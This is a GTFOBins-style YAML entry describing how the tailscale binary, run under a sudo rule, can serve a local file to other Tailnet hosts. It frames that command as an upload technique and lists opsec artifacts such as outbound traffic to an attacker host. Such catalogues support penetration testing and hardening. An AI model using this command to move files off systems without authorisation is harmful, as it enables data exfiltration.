---
name: tailscale
capabilities:
- upload
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: tailscale serve --http=12345 /path/to/input-file
  notes: The URL is reachable by any host of the same Tailnet.
references:
- https://gtfobins.github.io/gtfobins/tailscale/
tags: []
---
